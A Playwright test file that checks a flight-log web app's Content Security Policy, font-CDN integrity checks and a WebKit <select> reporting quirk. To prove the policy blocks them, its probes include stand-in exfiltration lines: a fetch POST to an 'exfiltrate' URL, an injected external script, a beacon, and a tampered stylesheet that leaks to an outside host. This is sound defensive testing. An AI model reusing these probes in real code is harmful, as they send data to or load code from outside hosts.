import { readFile } from "node:fs/promises";
import { expect, test, type Page } from "@playwright/test";
import { importArchive } from "../e2e/helpers/responsive";
import { openSettingsCategory } from "../e2e/helpers/settings";
import { documentPolicy } from "../apps/web/security-policy.mjs";

type Violation = {
  directive: string;
  blocked: string;
  sample: string;
  /** nodeName of the event target at the moment of the violation. */
  target: string;
  /** Whether that target carried a style attribute at that moment. */
  targetStyled: boolean;
};

type Observed = {
  violations: Violation[];
  /** Elements seen carrying a style attribute that CSP refused to apply. */
  blockedStyles: string[];
  /** <select> elements removed from the document since load. */
  selectsRemoved: number;
};

// WebKit (and only WebKit) reports a style-src-attr violation when a
// <select> renders: its user-agent shadow tree is styled internally. A
// minimal repro (production policy, bare page) shows the event targets the
// <select> itself, which has no style attribute; a real page violation
// targets the element carrying the style attribute (a <select> with its own
// style attribute included). When the <select> has already left the
// document by the time WebKit dispatches, the event is retargeted to the
// document; that shape is exempt only after a <select> was removed and while
// an independent detector (below) has seen no refused style attribute on any
// element. A real inline style anywhere, also on a page that has <select>s,
// is still caught.
const isQuirkShape = (violation: Violation) =>
  violation.directive === "style-src-attr" &&
  violation.blocked === "inline" &&
  violation.sample === "";
const webkitSelectQuirk = (violation: Violation, observed: Observed) =>
  isQuirkShape(violation) &&
  ((violation.target === "SELECT" && !violation.targetStyled) ||
    (violation.target === "#document" &&
      observed.selectsRemoved > 0 &&
      observed.blockedStyles.length === 0));
const webkitSelectConsole =
  /^Refused to apply a stylesheet because its hash, its nonce, or 'unsafe-inline' does not appear in the style-src directive/;

async function watchViolations(page: Page, browserName: string) {
  await page.addInitScript(() => {
    const state = window as unknown as {
      __cspViolations: unknown[];
      __blockedStyles: string[];
      __selectsRemoved: number;
    };
    state.__cspViolations = [];
    state.__blockedStyles = [];
    state.__selectsRemoved = 0;
    document.addEventListener(
      "securitypolicyviolation",
      (event) => {
        const target = event.target;
        state.__cspViolations.push({
          directive: event.effectiveDirective || event.violatedDirective,
          blocked: event.blockedURI,
          sample: event.sample,
          target: target instanceof Element ? target.nodeName : "#document",
          targetStyled:
            target instanceof Element && target.hasAttribute("style"),
        });
      },
      true,
    );
    // Second detector, independent of violation events: in WebKit (and
    // Chromium) a style attribute CSP refused keeps its text but exposes no
    // declarations (CSSOM writes, which CSP allows, keep the two in sync).
    // Firefox keeps the declarations without applying them, so there this
    // detector stays silent; it only gates WebKit's document exemption.
    const refused = (element: Element) => {
      const text = element.getAttribute("style");
      return (
        text !== null &&
        text.trim() !== "" &&
        (element as HTMLElement).style?.cssText === ""
      );
    };
    const check = (element: Element) => {
      for (const candidate of [element, ...element.querySelectorAll("[style]")])
        if (refused(candidate)) state.__blockedStyles.push(candidate.nodeName);
    };
    new MutationObserver((records) => {
      for (const record of records) {
        if (record.type === "attributes" && record.target instanceof Element)
          check(record.target);
        for (const node of record.addedNodes)
          if (node instanceof Element) check(node);
        for (const node of record.removedNodes)
          if (node instanceof Element)
            state.__selectsRemoved +=
              (node.matches("select") ? 1 : 0) +
              node.querySelectorAll("select").length;
      }
    }).observe(document, {
      subtree: true,
      childList: true,
      attributes: true,
      attributeFilter: ["style"],
    });
  });
  const consoleErrors: string[] = [];
  page.on("console", (message) => {
    if (message.type() === "error") consoleErrors.push(message.text());
  });
  page.on("pageerror", (error) => consoleErrors.push(error.message));
  const readAll = () =>
    page.evaluate(() => {
      const state = window as unknown as {
        __cspViolations: Violation[];
        __blockedStyles: string[];
        __selectsRemoved: number;
      };
      return {
        violations: state.__cspViolations,
        blockedStyles: state.__blockedStyles,
        selectsRemoved: state.__selectsRemoved,
      } satisfies Observed;
    });
  const real = (observed: Observed) =>
    browserName === "webkit"
      ? observed.violations.filter(
          (violation) => !webkitSelectQuirk(violation, observed),
        )
      : observed.violations;
  return {
    readAll,
    violations: async () => {
      const observed = await readAll();
      expect(observed.blockedStyles).toEqual([]);
      return real(observed);
    },
    // Async on purpose: console messages can land after an earlier
    // violations() snapshot, so the quirk events are re-read here and every
    // exempted console line must be matched by an exempt-shaped event.
    cspConsoleErrors: async () => {
      const csp = consoleErrors.filter((text) =>
        /Content.Security.Policy|CSP|style-src|script-src|connect-src/i.test(
          text,
        ),
      );
      const observed = await readAll();
      expect(observed.blockedStyles).toEqual([]);
      expect(real(observed)).toEqual([]);
      if (browserName !== "webkit") return csp;
      const quirks = csp.filter((text) => webkitSelectConsole.test(text));
      expect(quirks.length).toBeLessThanOrEqual(
        observed.violations.filter((violation) =>
          webkitSelectQuirk(violation, observed),
        ).length,
      );
      return csp.filter((text) => !webkitSelectConsole.test(text));
    },
    consoleErrors,
  };
}

test("production build enforces the documented policy @cross-browser", async ({
  page,
}) => {
  await page.goto("/");
  const meta = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content");
  expect(meta).toBe(documentPolicy);
  // Inline script, eval and cross-origin connections are refused.
  const probes = await page.evaluate(async () => {
    const results: Record<string, string> = {};
    // eval()/Function() cannot be probed from page.evaluate (DevTools
    // evaluation bypasses CSP); scripts/check-security-headers.mjs proves the
    // shipped bundles never call them, so 'unsafe-eval' is not needed.
    const marker = "__inlineRan";
    const script = document.createElement("script");
    script.textContent = `window.${marker} = true`;
    document.head.append(script);
    results.inline = (window as unknown as Record<string, unknown>)[marker]
      ? "allowed"
      : "blocked";
    try {
      await fetch("https://example.com/exfiltrate", {
        method: "POST",
        body: "x",
      });
      results.fetch = "allowed";
    } catch {
      results.fetch = "blocked";
    }
    results.external = await new Promise<string>((resolve) => {
      const external = document.createElement("script");
      external.src = "https://example.com/injected.js";
      external.onload = () => resolve("allowed");
      external.onerror = () => resolve("blocked");
      document.head.append(external);
    });
    results.beacon = navigator.sendBeacon("https://example.com/b", "x")
      ? "queued"
      : "refused";
    return results;
  });
  expect(probes.inline).toBe("blocked");
  expect(probes.fetch).toBe("blocked");
  expect(probes.external).toBe("blocked");
});

test("the demo archive starts without CSP violations @cross-browser", async ({
  page,
  browserName,
}) => {
  const watch = await watchViolations(page, browserName);
  await page.route("https://cdn.jsdelivr.net/**", (route) => route.abort());
  await page.goto("/");
  await page.getByRole("button", { name: "Try demo", exact: true }).click();
  await expect(page.locator(".flight-row").first()).toBeVisible();
  expect(await watch.violations()).toEqual([]);
  expect(await watch.cspConsoleErrors()).toEqual([]);
});

test("core journeys raise no CSP violation: import, Passport map/Globe, detail Globe, settings, export @cross-browser", async ({
  page,
  browserName,
}) => {
  test.setTimeout(120_000);
  const watch = await watchViolations(page, browserName);
  // Keep this journey independent of the optional font CDN (covered below).
  await page.route("https://cdn.jsdelivr.net/**", (route) => route.abort());

  await importArchive(page);
  await expect(
    page.locator(".passport-globe-frame, .route-map-canvas").first(),
  ).toBeVisible();
  await page.getByRole("button", { name: /Open UA123/ }).click();
  await expect(page.locator("#flight-detail-title")).toBeVisible();
  await expect(page.locator(".detail-globe-frame .globe-host")).toHaveAttribute(
    "data-ready",
    "true",
    { timeout: 30_000 },
  );

  await page.goto("/#settings");
  await openSettingsCategory(page, "Data and backup");
  const download = page.waitForEvent("download");
  await page
    .getByRole("button", { name: "Export Keepraw Fly JSON", exact: true })
    .click();
  const file = await (await download).path();
  const exported = JSON.parse(await readFile(file!, "utf8"));
  expect(exported.format).toBe("keepraw-fly");

  // Locale resources are fetched on demand (connect-src 'self').
  await openSettingsCategory(page, "General");
  await page.locator(".settings-fields select").first().selectOption("ja-JP");
  await expect(page.locator("html")).toHaveAttribute("lang", "ja-JP");
  await page.goto("/#passport");
  await expect(page.locator(".flight-row").first()).toBeVisible();

  expect(await watch.violations()).toEqual([]);
  expect(await watch.cspConsoleErrors()).toEqual([]);
});

test("MiSans stylesheets load with SRI under CSP and map their weights @cross-browser", async ({
  page,
  browserName,
}) => {
  test.setTimeout(90_000);
  const watch = await watchViolations(page, browserName);
  await importArchive(page);
  await page.goto("/#settings");
  await page.locator(".settings-fields select").first().selectOption("zh-CN");
  await page.goto("/#passport");
  const links = page.locator("link[data-chinese-webfont]");
  await expect(links).toHaveCount(3);
  await expect
    .poll(
      () =>
        links.evaluateAll((all) =>
          all.map((link) => (link as HTMLLinkElement).dataset.fontStatus),
        ),
      { timeout: 30_000 },
    )
    .toEqual(["loaded", "loaded", "loaded"]);
  const mapped = await links.evaluateAll((all) =>
    all.every((element) => {
      const link = element as HTMLLinkElement;
      return (
        link.integrity.startsWith("sha384-") &&
        link.crossOrigin === "anonymous" &&
        [...link.sheet!.cssRules].every(
          (rule) =>
            (rule as CSSFontFaceRule).style.fontFamily.replaceAll('"', "") ===
              link.dataset.fontFamily &&
            (rule as CSSFontFaceRule).style.fontWeight ===
              link.dataset.fontWeight,
        )
      );
    }),
  );
  expect(mapped).toBe(true);
  await expect(page.locator(".passport-map-title")).toHaveCSS(
    "font-family",
    /MiSans/,
  );
  expect(await watch.violations()).toEqual([]);
});

test("a tampered MiSans stylesheet is rejected by SRI and the UI falls back to system fonts @cross-browser", async ({
  page,
}) => {
  const served: string[] = [];
  await page.route(
    "https://cdn.jsdelivr.net/npm/misans-webfont@4.3.1/**/result.min.css",
    (route) => {
      served.push(route.request().url());
      return route.fulfill({
        status: 200,
        contentType: "text/css",
        headers: { "access-control-allow-origin": "*" },
        body: 'body { background: url("https://example.com/leak?x=1"); }',
      });
    },
  );
  await importArchive(page);
  await page.goto("/#settings");
  await page.locator(".settings-fields select").first().selectOption("zh-TW");
  await page.goto("/#passport");
  const links = page.locator("link[data-chinese-webfont]");
  await expect(links).toHaveCount(3);
  await expect
    .poll(() =>
      links.evaluateAll((all) =>
        all.map((link) => (link as HTMLLinkElement).dataset.fontStatus),
      ),
    )
    .toEqual(["unavailable", "unavailable", "unavailable"]);
  expect(served).toHaveLength(3);
  // The modified sheet was never applied (its body background is absent).
  expect(
    await page.evaluate(() => getComputedStyle(document.body).backgroundImage),
  ).toBe("none");
  await expect(page.locator(".flight-row").first()).toBeVisible();
  await expect(page.locator("html")).toHaveAttribute("lang", "zh-TW");
});

test("calibration: WebKit's <select> quirk keeps its exempt shape, other engines report nothing @cross-browser", async ({
  page,
  browserName,
}) => {
  const watch = await watchViolations(page, browserName);
  await page.goto("/");
  await page.evaluate(async () => {
    const select = document.createElement("select");
    select.append(new Option("x"), new Option("y"));
    document.body.append(select);
    select.getBoundingClientRect();
    select.value = "y";
    await new Promise((resolve) => setTimeout(resolve, 300));
    select.remove();
  });
  const observed = await watch.readAll();
  // If WebKit stops reporting this (or changes its shape), this fails:
  // remove or re-derive the exemption instead of letting it linger.
  expect(
    observed.violations.filter((v) => webkitSelectQuirk(v, observed)),
  ).toHaveLength(browserName === "webkit" ? 1 : 0);
  expect(observed.violations.filter((v) => !isQuirkShape(v))).toEqual([]);
  expect(observed.blockedStyles).toEqual([]);
  expect(await watch.violations()).toEqual([]);
});

test("a real inline style is detected on a page that has <select> elements @cross-browser", async ({
  page,
  browserName,
}) => {
  const watch = await watchViolations(page, browserName);
  await page.goto("/");
  await page.evaluate(async () => {
    const select = document.createElement("select");
    select.append(new Option("x"));
    document.body.append(select);
    select.getBoundingClientRect();
    await new Promise((resolve) => setTimeout(resolve, 200));
    // Real violations: a scripted style attribute, parsed markup, a style
    // attribute on the <select> itself (the quirk's own element), and a
    // styled element removed at once alongside a <select>, so its event is
    // retargeted to the document (the WebKit quirk's other shape).
    const div = document.createElement("div");
    div.setAttribute("style", "color: red");
    document.body.append(div);
    document.body.insertAdjacentHTML(
      "beforeend",
      '<span style="color: blue">x</span>',
    );
    select.setAttribute("style", "color: green");
    const fleeting = document.createElement("p");
    fleeting.setAttribute("style", "color: purple");
    document.body.append(fleeting);
    const spare = document.createElement("select");
    document.body.append(spare);
    fleeting.remove();
    spare.remove();
    await new Promise((resolve) => setTimeout(resolve, 300));
  });
  const observed = await watch.readAll();
  // The second detector sees every one where the exemption depends on it.
  if (browserName !== "firefox")
    expect([...observed.blockedStyles].sort()).toEqual([
      "DIV",
      "P",
      "SELECT",
      "SPAN",
    ]);
  // With a refused style seen, no document-targeted event is exempt, and
  // each engine's own reports for the attached elements survive the filter.
  const reported = observed.violations.filter(
    (v) =>
      v.directive === "style-src-attr" &&
      !(browserName === "webkit" && webkitSelectQuirk(v, observed)),
  );
  expect(reported.map((v) => v.target)).toEqual(
    expect.arrayContaining(["DIV", "SPAN", "SELECT", "#document"]),
  );
  expect(reported.length).toBeGreaterThanOrEqual(4);
  // The shared helper every journey uses fails on this page.
  await expect(watch.cspConsoleErrors()).rejects.toThrow();
  // None of them took effect.
  expect(
    await page.evaluate(() =>
      [...document.querySelectorAll("div[style], span[style], select[style]")]
        .map((element) => (element as HTMLElement).style.color)
        .join(""),
    ),
  ).toBe("");
});
